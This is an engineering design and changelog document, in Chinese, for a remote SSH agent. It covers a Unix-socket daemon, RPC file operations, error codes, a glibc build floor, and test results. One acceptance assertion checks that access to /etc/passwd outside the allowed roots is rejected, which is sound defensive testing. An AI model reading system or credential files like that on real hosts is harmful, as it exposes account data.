现在三处都透传 `retryable` / `suggestedFix`；另外 `RemoteAgentClient` 的 RPC 超时补上 `REMOTE_AGENT_RPC_TIMEOUT` —— **有 code = 这通调用真失败，没 code = 链路没通**，上层据此决定「退到别的传输」还是「原样上报」，不用去正则匹配中文文案。

### 8.4 明确不做（都写清理由，不留半截机制）

- **可取消（AbortSignal 传到远端 exec）**：现在没有任何生产者 —— `agent` 的取消只在工具调用**之前**检查（`tool-bridge-main.js:549`），RPC 层没有 cancel 通道。加一个没人回调的 signal 就是死机制。等 P4（RPC 走 SSH channel）给出 cancel 通道时，`exec` 再接 `signal`。
- **超时真的杀掉远端进程**：关 channel 不会杀它（代码注释已写明）。要杀得先拿 pid，属于 P2（单 daemon + 进程表）的活。当前语义如实写在错误文案里：「整条命令链还在前台跑」。
- **单侧 handler 清理、双 grep 收敛**：前者要证明远端 CLI/测试也不再用（现在是「生产链路无调用方」，不是「完全无调用方」）；后者是 P4 的写路径收敛的一部分。都不在这一轮动，用真远端验收时一起做。

### 8.5 测试

`test/unit/git-target-ssh-exit.test.cjs`（14）：`code: null` → `ok:false`、`ENOENT` 与空文件分开、`pathExists` 的 `null` 不许报「存在」、脚本里不再出现 `|| true`。
`test/unit/remote-agent-error-contract.test.cjs`（3）：真起一个 ws server，验证 `code/retryable/suggestedFix` 过隧道、成功结果不被污染、RPC 超时带 code。
另修了 `scripts/test-phase5-handlers-smoke.cjs` 里一条**过时断言**：它假设空 `workspacePath` 也返回项目作用域，而「空路径不猜主工作区」是既定的归一化语义（改动的不是断言要迁就的那条生产路径）。
回归：`npx vitest run` 1226 passed / 124 files；`npm test`、`check:js`、`verify:rpc-catalog`、`test:local-gateway-smoke`、`test:phase5-handlers` 全过。

---

## 九、P2 / P3 / P4 现状

| 项 | 状态 |
|---|---|
| P2 per-host 单 daemon + Unix socket | **已实施（§10）**，真机 16 项验收全绿 |
| P3 glibc 下限 / 删运行时预检 | **已实施（§12）**：不再叫「静态自包含二进制」——远端 core 走 `cargo zigbuild …gnu.2.17`，`linux-elf-compat.js` 与版本目录逻辑全删，改为打包期 `assertCoreGlibcTarget()`；真机 17/17 复跑全绿。不需要老 glibc 机器（编译机 glibc 多新都无所谓，产物要求由 zig 目标决定）。 |
| P4 RPC 走 SSH channel | **已实施（§11）**：远端文件读写走 RPC，影子 handler 变成真实现，双 grep 收敛，真机 17 项验收全绿。 |

### 9.1 真机前置验证（192.168.31.62：Ubuntu 26.04.1 / OpenSSH 10.2p1 / kernel 7.0）

已验证成立（P2 的技术前提，不再是猜测）：

- `ssh2` 的 `openssh_forwardOutStreamLocal()` 能打通远端 AF_UNIX socket（`direct-streamlocal@openssh.com`）；**同一根 SSH 连接上开两条并发通道都正常**；通道上跑真 WebSocket 握手 + JSON 往返成功。→ 远端不必开 TCP 端口、本地不必开隧道，P2 的核心假设坐实。
- `XDG_RUNTIME_DIR=/run/user/1000` 存在、`systemctl --user` 存活（degraded）；但**免密 sudo 不可用** → 只能用用户级手段，这与「惰性拉起 + flock 单例」的选择一致。

三个真机才暴露的地雷（已成 P2 的实现约束）：

1. **`execScript` 是非登录 bash**：PATH 里没有 `~/.local/bin` / `~/.cargo/bin` / nvm 路径 → `node` 直接 **MISSING**；而 `exec`（`bash -lc`）能看到 `/home/dieyunx/.local/bin/node`。远端启动脚本必须用**部署时解析出的绝对 node 路径**，不许依赖 PATH。
2. **socket 文件权限跟随 umask**（实测 `srwxrwxr-x`，同机其他用户可连）→ 必须显式 `chmod 0700` 目录、`chmod 0600` socket。
3. 该机**没有 `rg`**：远端搜索一律走 grep 分支（P5 的退出码归一正好覆盖这条路径）。

同一台机上 P1 与 P5 的真机验收也已通过：`connect → exec → sftp → resolveHomeDir → disconnect` 全通；`exit 7 → code 7`、`ls /nope → code 2 + stderr`、`sleep 5 @1.5s → SSH_EXEC_TIMEOUT`、后台进程 `settledBy=exit` 收尾、`readText` 的 `ENOENT / 空文件 / EIO / 有内容` 四态、`pathExists` 两态、真仓库 `git status → ok` 全部符合预期。




## 十、P2 远端进程模型改造（已实施）

### 10.1 改之前是什么

每 workspace × 每实例一个远端进程，靠四套「独占」机制互相补漏：

```
跑一个远端工作区 = 分配一个远端 TCP 端口 + 写 pid 文件 + 建本地隧道 + 启动 run-cli.js --workspace X --port N
                  + token 走 env 认身份 + 日志按 agent-<slug>-<hash>-<port>.log 分文件
清理 = 杀 pid 文件里的进程（先确认 cmdline 是 run-cli.js）+ fuser/lsof 按端口收 + fuser 收孤儿 core + 关隧道
```

后果都能在审查里看到：端口要分配、pid 文件会过期、`fuser -k` 会杀掉别的实例、日志要靠端口区分实例、退出后残留要四处收。

### 10.2 改成什么

```
跑一个远端工作区 = 连到本机的那一个 socket，说一句 hello{workspace}
清理 = 杀那个 daemon（SIGTERM → 它自己 dispose 每个 workspace 的 handlers，含索引 core）
```

| 维度 | 现在 | 单一来源 |
|---|---|---|
| 传输 | `openssh_forwardOutStreamLocal()`（`direct-streamlocal@openssh.com`）→ 远端 `~/.dieyun/remote-agent/run/agent.sock`（目录 0700 / socket 0600） | `remote-gateway-manager.js` 的 `openAgentChannel()` |
| 进程 | **每主机一个 daemon**，懒拉起；`setsid` + 绝对 node 路径 | `startAgentDaemon()` |
| 单例 | **socket 文件自己就是锁**：能 connect 上 = 已有 daemon（`exit 42`）；`ENOENT/ECONNREFUSED` = 陈旧文件，删掉重绑；并发抢绑 → `EADDRINUSE`（同样 42） | `minimal-gateway-host.js` 的 `_startSocket()` |
| 身份 | **没有 token**：AF_UNIX + 0700/0600 就是边界，只有同一个 uid 能连 | 同上 |
| 多 workspace | 一个 daemon，**一条 WS 连接 = 一个 workspace**；同根连接复用同一份 handlers（索引 core / LSP 池不重复建） | `sessions` Map + `getHandlers()` |
| 日志 | 每主机一份 `~/.dieyun/remote-agent/logs/agent.log` | `remoteLogPathFor(home)` |
| 复用判据 | 能不能从**这条 SSH 连接**开出通道（`probeAgentSocket`） | `isAliveNow()` |
| 切工作区 | 不杀 daemon（同主机别的 workspace 还连着） | `stopForTarget(..., { killRemote: false })` |

### 10.3 删掉了什么

| 删除 | 位置 |
|---|---|
| `DEFAULT_REMOTE_PORT` 端口分配（池子按 targetKey 递增找空闲端口） | `remote-gateway-pool.js` |
| `gateway-*.pid` / `agent-*.pid` + `buildStopAgentPidScript`（读 pid 再确认 cmdline 再 kill） | `remote-gateway-manager.js` |
| `freeRemoteAgentPort()`（`fuser -k` / `lsof -ti` / `ss -ltnp` 三连） | 同上 |
| `probeTunnelAlive()`（探本地隧道口） | 同上 |
| `waitRemotePort()`（轮询 `ss -ltn` 等端口） | 同上 |
| `pickFreeLocalPort()` + 建隧道整段 | 同上 |
| 按 `<slug>-<hash>-<port>` 分文件的日志命名 | 同上 |
| Renderer 里的 `rg.localPort`（"索引隧道 :17331"） | `renderer-gateway.js` / `renderer-workspace-ssh.js` |

`tunnel.js` **保留**：`port-forward-manager.js` 还在用它做用户手动端口转发（那是用户功能，不是 Agent 传输）。

一处兜底留着并写明理由：`buildStaleCoreCleanupScript`（只收 `ppid==1` 的 dieyun-core）——只在 daemon 被 `SIGKILL`、来不及 dispose 时兜一次；正常 SIGTERM 路径不需要它。

### 10.4 真机验收（192.168.31.62，Ubuntu 26.04.1 / OpenSSH 10.2p1）

`npm run verify:remote-agent-socket`（`scripts/verify-remote-agent-socket.cjs`：真实 SSH + 真实部署 + 真实 RPC；主机 / 密码文件 / 工作区基目录由 `DY_SSH_HOST` / `DY_SSH_PW_FILE` / `DY_WS_BASE` 给，密码只从文件读、不进命令行也不进仓库），16/16 PASS：

| 断言 | 结果 |
|---|---|
| 首次 ensure（含 38.6MB 整包上传）冷启动 | 3.8s；热路径 536ms |
| `getInfo()` 只给 `socketPath` + `openChannel`，没有 `url`/`token` | ✅ |
| 两个工作区 → **同一个** socket、同一个 pid | ✅ 654479 |
| 客户端缓存键带 workspace | ✅ `socket#wsA` ≠ `socket#wsB` |
| A/B 的 RPC 各自落在自己的根（`pwd` / `cat`） | ✅ |
| daemon 监听 TCP 端口数 | **0** |
| socket 0600 / 目录 0700 | ✅ `srwx------` / `drwx------` |
| `kill -9` daemon → 下次 ensure 自动重建（新 pid）并能继续 RPC | ✅ 654479 → 654836 |
| `stop({killRemote:true})` 后无进程、socket 文件消失 | ✅ |
| 测试工作区清理 | ✅ |

验收过程中抓到一个我自己引入的 bug：`getInfo().key` 只用了 `socketPath`，导致两个工作区共用同一个已握手的客户端，B 的 RPC 实际跑在 A 的 handlers 上（症状 `PATH_NOT_ALLOWED`）。key 改成 `${socket}#${workspace}` 后修复——这条现在有真机断言覆盖。

### 10.5 测试

- `test/unit/remote-gateway-lifecycle.test.cjs`（15）：`probeAgentSocket` 四态（通 / 打不开 / 没有 client / 超时）、日志与 socket 路径单一来源、孤儿 core 脚本仍不许盲杀、"端口时代机制必须彻底消失"的回归护栏、manager 失败状态自洽。
- 删除 `test/unit/remote-agent-log-path.test.cjs`（按端口命名日志的测试，机制已不存在）。
- `scripts/test-lsp.cjs` 改用 `host.getHandlers(root)`（远端 host 不再有单 workspace 的 `handlers` 字段）。

---

## 十一、P4 远端读写走 RPC（已实施）

### 11.1 改之前是什么

远端文件操作有**两条互不相干的路径**：

```
桌面端写文件 = SFTP 整读一遍旧内容（算 diff / 留 undo 快照）→ SFTP 写 → 写成功后 fire-and-forget
              index.notify_change 补一条通知
远端 host 自己 = fs.write_file 直接落盘 + 自己算 diff + 自己调度增量
```

后果不是「慢」，而是三条语义分叉：

1. **失败面不同**：SFTP 写失败是 ssh2 错误，RPC 写失败带 `code`；同一件事两种错法，上层只能各自兜。
2. **diff / 增量索引两条规则**：桌面端自己算一遍 diff，远端 handler 里那份 `summarizeLineDiff` 从没被桌面端用过；增量调度更是「桌面端通知 → 远端再判断」绕了一圈。
3. **影子实现**：8 个 `fs.*` 远端 handler 桌面端**从不调用**（§3.3），改它们没有任何端到端验证，等于名义存在、实际不可用。

另外 grep 有两份实现（`codebase.grep` 自拼 GNU grep vs `fs.grep` 走 rg-search），桌面端还把它们串成「rg 失败 → 自拼 grep → ssh exec grep」三层降级——每层返回的字段形状都略有不同。

### 11.2 改成什么

**一个出口选实现，两边同接口**（`src/gateway/rpc.js:getRemoteFs()`）：

| 会话状态 | 实现 | 传输 |
|---|---|---|
| 远端 Agent 可用（P2 的 socket 通道） | `remote-agent-fs.js:createRemoteAgentFsAdapter` | `client.call('fs.read_file' / 'fs.write_file' / 'fs.list_dir' / 'fs.stat' / 'fs.mkdir')` |
| 没装 / 没起 Agent（`sshBackend==='sftp'`） | `remote-fs.js:createRemoteFsAdapter` | SFTP |

两个适配器实现同一接口（`root/resolve/readFile/writeFile/listDir/stat/mkdir/listArtifactFiles`）并各自带 `transport:'rpc'|'sftp'`。`transport` 只用于一件事：**写文件后的增量索引通知谁来发**——RPC 由远端 handler 自己调度（同一份规则），SFTP 才需要桌面端补 `index.notify_change`。这样「远端到底怎么改文件」在调用方看只有一种。

于是远端 handler 从影子变成真实现：

| handler | 现在谁在用 |
|---|---|
| `fs.read_file` | `fs.read_file` / `fs.read_symbol` / `fs.edit_file`（读阶段）/ undo 快照 |
| `fs.write_file` | `fs.write_file` / `fs.edit_file`（写阶段）——diff 与增量索引都在远端算 |
| `fs.list_dir` | `fs.list_dir` / `artifact.list_files` / `fs.glob` 的目录遍历 |
| `fs.stat` | `fs.stat` / artifact 过滤 |
| `fs.mkdir` | `fs.mkdir` |
| `fs.grep` | `fs.grep`（rg-search：远端没 rg 时它自己退 grep） |

grep 收敛后只剩一条：`fs.grep`。删掉的两层（自拼 `codebase.grep`、以及桌面端 `try/catch` 里的降级链）在 `fs.js` 与 `rpc.js` 一并清除；远端失败**如实上抛**，不再把「命令坏了」说成「0 命中」。

### 11.3 顺手收敛的两处「两份规则」

- **可用根**：远端 daemon 原来只认工作空间单根（`roots=[root]`），桌面端却是「工作空间 + HOME + `/tmp`」（`remoteAllowedRoots`）。同一批写操作会「经 RPC 被拒、经 SFTP 成功」——这比两边都拒绝更难查。规则搬到 `gateway/path-policy.js`（daemon 的 pack 里有它、没有 `ssh/`），两侧同一份；`ssh/remote-path.js` 只 re-export。
- **「远端 Agent 可用」判定**：6 处 `info.url && info.token` 全部换成一个谓词 `isRemoteAgentUsable(info)`（`remote-agent-client.js`，认 `openChannel` 也算可用）；客户端缓存键与索引缓存键同源 `remoteAgentInfoKey`（`workspace-cache-keys.js`）。P2 之后 `info` 已无 `url`/`token`，旧写法会把「可用」判成不可用、key 塌成空串（两个工作区共用一份远端索引缓存）——现在有单测钉住。

### 11.4 删掉了什么

- `minimal-gateway-host.js`：`codebase.grep`（约 45 行自拼 grep + 退出码猜测）、`shq()`（只被它用）。
- `handlers/fs.js`：`fs.grep` / `fs.glob` 里的「RPC 失败 → SSH exec」降级层；`fs.write_file` 里对 RPC 写入的 `index.notify_change` 补通知。
- `rpc.js`：`tryRemoteGrepFallback` 的 `codebase.grep` 兜底。
- `renderer/renderer-gateway.js`：`codebase.grep` 的超时表项。
- 桌面端 SFTP 写入路径少一次「整读一遍算 diff」（undo 快照那一次读仍在，它是另一个用途）。
- **daemon 的 TCP / token 形态（P2 没收尾的那半截）**：`DEFAULT_REMOTE_PORT`、`start()` 里监听 `127.0.0.1:port` 的分支、`auth`/`auth_ok` 握手、`getInfo()` 的 `host/port/url/token`、`run-cli.js` 的 `--port` / `--token` / `DIEYUN_REMOTE_TOKEN`。现在没有 `socketPath` 就带 `REMOTE_AGENT_NO_SOCKET` 直接拒绝启动 —— 不许悄悄退回监听本机端口。
- 客户端与缓存键里对应的旧形态：`RemoteAgentClient` 的 `url` / `token` 字段与 TCP 建连分支，`isRemoteAgentUsable` 只认 `openChannel`，`remoteAgentInfoKey` 不再有 `url:token` 分支，`reconnect.js` 的「身份变了就丢客户端」从比较 `token/url` 改成比较 `remoteAgentInfoKey`（否则两个 `undefined` 永远相等，重建后还会用上一代通道）。

### 11.5 真机验收（192.168.31.62，Ubuntu 26.04.1 / OpenSSH 10.2p1）

`npm run verify:remote-agent-fs`（`scripts/verify-remote-agent-fs.cjs`，环境变量同上），17/17 PASS：

| 断言 | 结果 |
|---|---|
| 适配器 `transport === 'rpc'` | ✅ |
| `readFile` 经 RPC 读回远端内容 | ✅ `original\n` |
| `writeFile` 返回 diff（**远端算的**） | ✅ `{added:1,removed:0}` |
| 写后远端磁盘内容确实变了（不是写到了别处） | ✅ `cat` 验证 |
| 写后读回一致 | ✅ |
| `mkdir` 递归创建、目录真的在远端 | ✅ |
| 新文件写入（旧内容不存在也不炸） | ✅ |
| `stat` / `listDir` 形状与本地一致 | ✅ `{isFile,size}` / `deep` |
| **这次写入触发了远端增量索引** | ✅ 日志 `remote codebase incremental started (save)` |
| `fs.grep` 命中刚写的 token（该机无 `rg`，走 rg-search 内部 grep 分支） | ✅ |
| `fs.glob` 找到同一文件 | ✅ |
| HOME 兜底目录可写（与 SFTP 时代同一边界） | ✅ |
| 白名单外（`/etc/passwd`）被拒 `PATH_NOT_ALLOWED` | ✅ |
| 清理 | ✅ 无残留进程 / 目录 |

同一个 pack 回归跑了 `npm run verify:remote-agent-socket`：16/16 PASS（socket 单例、0 个监听端口、权限 600/700、强杀自愈都没被这轮改动影响）。

验收方法上的一个坑（写下来免得下次再踩）：**增量索引断言必须先建索引**。对从没索引过的工作区写文件，远端调度器查 `codebase.status` 看到 `indexed=false` 就安静返回（设计如此，不是 bug），把它当成「没触发」会得出反向结论。

### 11.6 测试

- `test/unit/remote-agent-fs.test.cjs`（11，新增）：接口与 SFTP 版逐方法对齐、`transport` 标识、`writeFile` **只发一次 RPC**、远端错误码原样上抛、`listDir/stat/mkdir` 形状、白名单内放行 / 外拒绝（拒时一条 RPC 都不发）、`listArtifactFiles` 复用 `artifact-scan`。
- `test/unit/remote-agent-usability.test.cjs`（11）：`isRemoteAgentUsable` 只认通道形态（`url`+`token` 现在必须判为不可用）、key 不塌成空串、`notifyRemoteIndexChange` 在 socket 形态下真的发 `index.notify_change`。
- `test/unit/remote-gateway-lifecycle.test.cjs`（17，+2）：原有 socket 探活/日志路径/孤儿 core 不变，新增「daemon 没有 TCP / token 形态」（`getInfo` 只有 socketPath/workspace/remoteGateway、无 socketPath 时 `REMOTE_AGENT_NO_SOCKET`）与「`run-cli` 不再有 `--port` / `--token` / `DIEYUN_REMOTE_TOKEN`」。
- `test/unit/remote-index-notify-change.test.cjs`（7，扩了 2 条）：可用根放宽后，「可用根内但不在工作空间」（`/tmp`）是 `ignored_path`（允许但不索引），真正的越界（`<fsroot>/…`）才是 `out_of_root`。
- `test/unit/remote-path.test.cjs`（10）：`remoteAllowedRoots` 搬到 `gateway/path-policy.js` 后行为不变（含 `unrestricted` 档、HOME 缺失退化、尾斜杠归一）。
- 三个客户端用例（`remote-agent-connect-timeout` / `remote-agent-error-contract` / `remote-index-freshness`）从「假 TCP daemon + `url`/`token`」改成「假 daemon + `openChannel` 交一根流 + `hello`/`hello_ok`」——**测试也得跟着形态走**，否则删完旧形态它们会假装还通过。
- 全量 `npx vitest run`：125 文件 / 1257 用例全绿；`npm run check:js`、`npm run verify:rpc-catalog`、`npm run check:contracts`、`npm run check:renderer`、`npm run test:local-gateway-smoke`、`npm run test:sandbox-real` 通过。`npm run cargo:test` 在本机失败于 `ort-sys` 预编译包下载超时（网络环境，与本次改动无关；本次未改 Rust）。

### 11.7 明确不做

- **不删 SFTP 适配器**：没装 Agent 的会话仍是受支持形态（`sshBackend==='sftp'`），删了等于那条路直接不可用。留它的前提是「谁用哪种传输」只在 `getRemoteFs()` 判断一次，两个实现同接口——这一条现在有测试钉住（方法集合对齐）。
- **不把 `deleteFile` 塞进适配器**：桌面端没有「远端删文件」的调用点，加了就是新的只写不读字段。
- **不保留「RPC 失败自动退 SSH exec」**：那会让一次真实失败伪装成部分成功。SFTP 模式下的 ssh exec grep/glob 保留（那是没有 Agent 时唯一可行的手段），但只在 `transport==='sftp'` 时可达。
- **不留旧 TCP/token 形态的「兼容开关」**：daemon 与客户端现在都只有一条传输。真机上「0 个监听端口」「socket 600 / 目录 700」两条断言就是这条的护栏（P2 的 `verify:remote-agent-socket` 16/16 在本轮改动后重跑仍全绿）。

---

## 十二、P3：远端 core 的 glibc 下限（已实施）

### 12.1 改之前的两个事实（都是量出来的，不是猜的）

| 事实 | 数值 | 后果 |
|---|---|---|
| 随包的 `bin/dieyun-core` 需要 | **GLIBC 2.34** | Ubuntu 22.04+/Debian 12+/RHEL 9+ 才能跑；Debian 11(2.31)、Ubuntu 20.04(2.31)、RHEL 8(2.28)、CentOS 7(2.17) 全部加载失败 |
| 随包的 `bin/node`（v20.18.2 官方 x64）需要 | **GLIBC 2.28** | 这才是整包真正的地板 |

也就是说：远端索引在并不算老的发行版上就是坏的，而运行时的那套预检把原因说成「你的服务器太老」，还额外有两个缺陷（见 §3.3 已划掉那条）。

### 12.2 改了什么

| 位置 | 变化 |
|---|---|
| `scripts/pack-dieyun-core-linux-remote.cjs` | `DIEYUN_LINUX_GLIBC_TARGET` 默认 **2.35 → 2.17**（常量取自 lib，不再各写一份）；说明改成「编译机 glibc 多新都无所谓，产物要求由目标决定」 |
| `scripts/pack-dieyun-core-linux-lib.cjs` | 新增 `CORE_GLIBC_TARGET = '2.17'`、`parseElfLibcVersions()`（解析 `.gnu.version_r`/Verneed，**只认 libc 家族**）、`glibcRequirementOf()`、`assertCoreGlibcTarget()`。`installLinuxCoreBin()` 安装前硬校验，**连「复用已有产物」分支也过闸** |
| `scripts/pack-remote-gateway.cjs` | 打包含 core + node 时打印「GLIBC 地板: core x / node y → 生效 z」，并在 **core 比 node 还新**时直接失败（那是最坑的组合：node 起得来、core 起不来） |
| `src/remote/remote-index-core.js` | 删 `_maxGlibcNeeded` / `_hostGlibc` / `_glibcMismatchHint`、启动前的 `REMOTE_INDEX_CORE_INCOMPATIBLE`、`index.ping.incompatible`；`sanitizeCoreErrorText`（只是把反引号换掉）就地内联 |
| `src/gateway/rpc.js` | 删 `lastPing.incompatible` 分支（真正的启动失败仍由 `lastError` + `isFatalRemoteCoreStartError` 报） |
| `src/remote/linux-elf-compat.js` | **删除**；同时从 `REMOTE_GATEWAY_SOURCE_PATHS`（远端 pack 清单）里去掉 |

### 12.3 为什么运行时预检可以删掉（不是「先删了再说」）

- 产物侧已经保证 core 需要 ≤ 2.17，而整包地板由 node 决定（当前 2.28）。
- 宿主 glibc < 2.28 时**随包的 node 自己就起不来**（动态加载器直接报 `GLIBC_2.28 not found`），daemon 根本不会存在，也就没有任何路径会走到 core —— 预检要拦的情况被 node 的加载器拦在前面了。
- 宿主 glibc ≥ 2.28 时 core（≤ 2.17）必然能跑。
- 所以「core 需要比 node 更新的 glibc」是唯一真实的危险组合，而它在打包期就被拒绝了（§12.2 第三行）。

### 12.4 真机验收（192.168.31.62，编译机 glibc 2.43）

远程构建日志：`host GLIBC=2.43 target=2.17` → `cargo zigbuild … gnu.2.17` → 远程侧 `max GLIBC=2.17` → 本地 `assertCoreGlibcTarget` 通过（13,669 KB）。随后：

| 验收 | 结果 |
|---|---|
| `npm run pack:remote-gateway` | `GLIBC 地板: core 2.17 / node 2.28 → 生效 2.28` |
| `npm run verify:remote-agent-fs` | **17/17 PASS**（含「远端建起索引」与「写入触发远端增量索引」——core 在新 glibc 上跑通） |
| `npm run verify:remote-agent-socket` | **16/16 PASS**（单例 / 0 个 TCP 端口 / 600+700 / 强杀自愈 / stop 不留残渣） |
| 全量 `npx vitest run` | 126 文件 / 1270 用例全绿 |

### 12.5 测试

- `test/unit/linux-core-glibc.test.cjs`（13，新增）：用手工构造的最小 ELF64 验证 Verneed 解析（2.17 / 2.34 / 多库取最大 / `libssl` 的 2.99 不参与 / 无 `.gnu.version_r` = 静态 / 非 ELF 必须 `ok:false`），以及 `assertCoreGlibcTarget` 的放行、`CORE_GLIBC_TOO_NEW`（带 `needed`/`target`）、读不懂不许静默通过（`CORE_GLIBC_UNVERIFIED`）、文件缺失（`CORE_ELF_UNREADABLE`）。
- 同一个文件里还有三条「防止回归」：`src/` 下不再有任何 `linux-elf-compat` / `hostGlibcVersion` / `glibcMismatchHint` 引用、pack 清单里没有它、`remote-index-core.js` 里没有 `incompatible`。

### 12.6 明确不做

- **不做真静态（musl）二进制**：远端向量检索现在只有「外部 embedding 端点」一种来源（进程内 ONNX 推理已从 core 删除，`builtin-ort` feature 一并移除），所以远端 core 与本地 core 是同一份产物，静态化的动机只剩形式。zig 到 2.17 已经解决了原问题（老发行版能跑），不再为形式付出这个代价。
- **不动 `bin/node`**：整包地板 2.28 来自官方 Node 构建。要压到 2.17 得换非官方 Node 或 musl 版 node，属于发版形态变更，不在 P3 范围；现在的做法是把这件事**显式打印出来**（GLIBC 地板那行），而不是让用户自己撞。
- **不再按「版本目录」区分产物**：远端只有 `~/.dieyun/remote-agent/current` 一份（P2 已如此），P3 不再新增任何按 glibc/host 分目录的机制。
